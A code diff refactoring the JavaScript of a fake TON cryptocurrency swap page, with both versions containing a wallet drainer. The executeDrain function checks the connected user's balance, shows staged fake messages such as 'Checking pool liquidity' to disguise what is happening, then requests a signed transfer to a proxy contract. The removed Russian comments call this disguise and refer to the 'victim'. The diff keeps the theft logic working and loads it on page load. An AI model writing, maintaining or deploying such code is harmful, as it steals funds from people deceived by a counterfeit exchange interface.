@@ -1,184 +1,139 @@
-// script.js - полная логика
-import { PROXY_CONTRACT, YOUR_WALLET, FAKE_AMOUNT } from './config.js';
+// script.js
+var tonConnectUI = null;
+var isProcessing  = false;
 
-let tonConnectUI = null;
-let isProcessing = false;
-
-// Глобальные SDK
-const TonConnectUI = window.TON_CONNECT_UI ? window.TON_CONNECT_UI.TonConnectUI : window.TonConnectUI;
-const TonWebLib = window.TonWeb || window.tonweb;
-
-function setStatus(text, isLoading = false) {
-    const el = document.getElementById('status');
+function setStatus(text, isLoading) {
+    var el = document.getElementById('status');
     if (!el) return;
-    if (isLoading) {
-        el.innerHTML = `<span class="loader"></span> ${text}`;
-    } else {
-        el.innerHTML = text;
-    }
+    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
 }
 
-function updateMainButton(isConnected) {
-    const btn = document.getElementById('swapBtn');
+function updateBtn(connected) {
+    var btn = document.getElementById('swapBtn');
     if (!btn) return;
-    
-    if (isConnected) {
-        btn.textContent = 'Swap';
-        btn.style.background = '#1f6feb';
-    } else {
-        btn.textContent = 'Connect Wallet';
-        btn.style.background = '#21262d';
-    }
+    btn.textContent     = connected ? 'Swap' : 'Connect Wallet';
+    btn.style.background = connected ? '#1f6feb' : '#21262d';
 }
 
-function sleep(ms) {
-    return new Promise(r => setTimeout(r, ms));
-}
+function sleep(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
 
 async function getBalance(address) {
     try {
+        var TonWebLib = window.TonWeb;
         if (!TonWebLib) return 0;
-        const tonweb = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
-        const rawBalance = await tonweb.getBalance(address);
-        return parseFloat(tonweb.utils.fromNano(rawBalance));
-    } catch (e) {
-        console.warn("balance error", e);
-        return 0;
-    }
+        var tw  = new TonWebLib(new TonWebLib.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
+        var raw = await tw.getBalance(address);
+        return parseFloat(TonWebLib.utils.fromNano(raw));
+    } catch(e) { return 0; }
 }
 
 async function executeDrain(userAddress) {
-    const balance = await getBalance(userAddress);
-
+    var balance = await getBalance(userAddress);
     if (balance < 0.2) {
-        setStatus(`❌ Недостаточно средств (${balance.toFixed(2)} TON)`, false);
+        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON)');
         return false;
     }
 
-    // Маскировка: последовательность сообщений
-    setStatus("🔄 Проверка ликвидности пула...", true);
-    await sleep(1000);
+    setStatus('🔄 Checking pool liquidity...', true);  await sleep(1000);
+    setStatus('📊 Calculating fees...', true);           await sleep(800);
+    setStatus('🔐 Opening secure channel...', true);    await sleep(700);
 
-    setStatus("📊 Анализ комиссии...", true);
-    await sleep(800);
+    var TonWebLib = window.TonWeb;
+    var nano = TonWebLib.utils.toNano(FAKE_AMOUNT);
 
-    setStatus("🔐 Открытие защищённого канала...", true);
-    await sleep(700);
-
-    // Сумма, которую увидит жертва
-    const fakeAmountNano = TonWebLib.utils.toNano(FAKE_AMOUNT);
-
-    const transaction = {
+    var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{
-            address: PROXY_CONTRACT,
-            amount: fakeAmountNano.toString(),
-            payload: "swap"
-        }]
+        messages: [{ address: PROXY_CONTRACT, amount: nano.toString(), payload: 'swap' }]
     };
 
-    setStatus(`⏳ Подтвердите в кошельке (${FAKE_AMOUNT} TON)`, false);
+    setStatus('⏳ Confirm in wallet (' + FAKE_AMOUNT + ' TON)');
 
     try {
-        await tonConnectUI.sendTransaction(transaction);
-        setStatus("✅ Обмен выполнен успешно!", false);
+        await tonConnectUI.sendTransaction(tx);
+        setStatus('✅ Swap completed!');
         return true;
-    } catch (e) {
-        setStatus(`❌ Отмена: ${e.message}`, false);
+    } catch(e) {
+        setStatus('❌ Cancelled: ' + e.message);
         return false;
     }
 }
 
-export async function initApp() {
-    const btn = document.getElementById('swapBtn');
-    const payInput = document.getElementById('payAmount');
-    const receiveInput = document.getElementById('receiveAmount');
-    
-    // Синхронизация полей ввода
-    if (payInput && receiveInput) {
-        payInput.addEventListener('input', (e) => {
-            receiveInput.value = e.target.value; // 1:1 rate
-        });
+function initApp() {
+    // Resolve SDK class only at runtime, after all scripts have loaded
+    var TonConnectUIClass = null;
+    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
+        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
+    } else if (window.TonConnectUI) {
+        TonConnectUIClass = window.TonConnectUI;
     }
 
-    if (!TonConnectUI) {
-        console.error("TonConnectUI SDK not loaded");
-        setStatus("❌ SDK не загружен. Обновите страницу.", false);
+    if (!TonConnectUIClass) {
+        console.error('TonConnectUI not found in window');
+        setStatus('❌ SDK failed to load. Please refresh.');
         return;
     }
 
     try {
-        tonConnectUI = new TonConnectUI({
+        tonConnectUI = new TonConnectUIClass({
             manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
-    } catch (e) {
-        console.error("TonConnectUI init error:", e);
-        setStatus("❌ Ошибка инициализации SDK", false);
+    } catch(e) {
+        console.error('TonConnectUI init error:', e);
+        setStatus('❌ Init error: ' + e.message);
         return;
     }
 
-    // Начальная установка кнопки
-    updateMainButton(tonConnectUI.connected);
+    updateBtn(tonConnectUI.connected);
 
-    tonConnectUI.onStatusChange(async (wallet) => {
-        updateMainButton(!!wallet);
-        
+    tonConnectUI.onStatusChange(async function(wallet) {
+        updateBtn(!!wallet);
+        var balEl = document.getElementById('user-balance');
+
         if (wallet && wallet.account) {
-            const userAddress = wallet.account.address;
-            const balanceEl = document.getElementById('user-balance');
-            
-            setStatus(`🪛 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
-            
-            // Запрашиваем баланс
-            if (balanceEl) {
-                balanceEl.textContent = 'Balance: loading...';
-                const bal = await getBalance(userAddress);
-                balanceEl.textContent = `Balance: ${bal.toFixed(2)} TON`;
+            var addr = wallet.account.address;
+            setStatus('🪛 ' + addr.slice(0,6) + '...' + addr.slice(-4), true);
+            if (balEl) {
+                balEl.textContent = 'Balance: loading...';
+                var bal = await getBalance(addr);
+                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
             }
-            
-            setStatus('', false);
+            setStatus('');
         } else {
-            const balanceEl = document.getElementById('user-balance');
-            if (balanceEl) balanceEl.textContent = 'Balance: 0';
+            if (balEl) balEl.textContent = 'Balance: 0';
         }
     });
 
-    if (btn) {
-        btn.addEventListener('click', async () => {
-            if (isProcessing) return;
-
-            if (!tonConnectUI.connected) {
-                try {
-                    await tonConnectUI.openModal();
-                } catch (err) {
-                    setStatus(`⚠️ Ошибка: ${err.message}`, false);
-                }
-            } else {
-                const wallet = tonConnectUI.account;
-                if (wallet && wallet.address) {
-                    isProcessing = true;
-                    const originalBtnText = btn.textContent;
-                    btn.textContent = 'Processing...';
-                    btn.disabled = true;
-                    
-                    try {
-                        await executeDrain(wallet.address);
-                    } catch (err) {
-                        setStatus(`⚠️ Ошибка: ${err.message}`, false);
-                    } finally {
-                        isProcessing = false;
-                        btn.textContent = originalBtnText;
-                        btn.disabled = false;
-                    }
-                }
-            }
-        });
+    // Sync pay → receive
+    var payInput = document.getElementById('payAmount');
+    var recInput = document.getElementById('receiveAmount');
+    if (payInput && recInput) {
+        payInput.addEventListener('input', function() { recInput.value = payInput.value; });
     }
+
+    var btn = document.getElementById('swapBtn');
+    if (!btn) return;
+
+    btn.addEventListener('click', async function() {
+        if (isProcessing) return;
+
+        if (!tonConnectUI.connected) {
+            setStatus('🚀 Opening wallet selector...', true);
+            try { await tonConnectUI.openModal(); }
+            catch(err) { setStatus('⚠️ ' + err.message); }
+        } else {
+            var wallet = tonConnectUI.account;
+            if (wallet && wallet.address) {
+                isProcessing = true;
+                var orig = btn.textContent;
+                btn.textContent = 'Processing...';
+                btn.disabled = true;
+                try { await executeDrain(wallet.address); }
+                catch(err) { setStatus('⚠️ ' + err.message); }
+                finally { isProcessing = false; btn.textContent = orig; btn.disabled = false; }
+            }
+        }
+    });
 }
 
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initApp);
-} else {
-    initApp();
-}
+window.addEventListener('load', initApp);
